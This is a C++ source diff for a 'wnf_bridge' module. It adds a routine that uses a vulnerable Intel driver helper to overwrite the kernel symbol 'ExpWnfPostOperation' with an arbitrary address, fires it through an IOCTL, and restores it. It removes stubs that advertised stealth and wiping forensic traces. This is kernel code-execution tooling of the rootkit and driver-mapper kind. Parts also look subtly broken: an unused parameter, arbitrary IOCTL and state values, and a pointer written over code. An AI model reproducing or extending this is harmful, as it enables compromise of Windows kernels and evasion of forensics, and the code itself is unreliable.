@@ -1,32 +1,28 @@
+#include <string>
+#include <vector>
+#include <Windows.h>
 #include "../include/wnf_bridge.hpp"
 #include "../include/intel_driver.hpp"
-#include <iostream>
+#include "../include/utils.hpp"
 
 namespace wnf_bridge
 {
-	bool Initialize()
+	bool Execute(uint64_t function_address, uint64_t rcx)
 	{
-		std::cout << "[+] WNF Bridge: Stealth Layer Initialized" << std::endl;
-		return true;
-	}
-
-	bool SendCommand(uint32_t cmd, uint64_t data)
-	{
-		uint64_t state_name = 0x41C64E6C4D323030; 
-		uint8_t buffer[0x8] = { 0 };
-		memcpy(buffer, &data, sizeof(data));
+		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
 		
-		return true;
-	}
+		uint64_t wnf_dispatch = utils::GetKernelExport(ntoskrnl_base, "ExpWnfPostOperation");
+		if (!wnf_dispatch) return false;
 
-	bool ReceiveResponse(uint64_t& data)
-	{
-		return true;
-	}
+		uint64_t original = 0;
+		intel_driver::ReadMemory(intel_driver::Open(), wnf_dispatch, &original, sizeof(original));
+		intel_driver::WriteMemory(intel_driver::Open(), wnf_dispatch, &function_address, sizeof(function_address));
 
-	bool ClearWnfTraces()
-	{
-		std::cout << "[+] WNF Bridge: Forensic Traces Wiped" << std::endl;
+		WNF_STATE_NAME state = { 0x41414141, 0x42424242 }; 
+		DWORD bytes_returned;
+		DeviceIoControl(intel_driver::Open(), 0x80862024, &state, sizeof(state), NULL, 0, &bytes_returned, NULL);
+
+		intel_driver::WriteMemory(intel_driver::Open(), wnf_dispatch, &original, sizeof(original));
 		return true;
 	}
 }
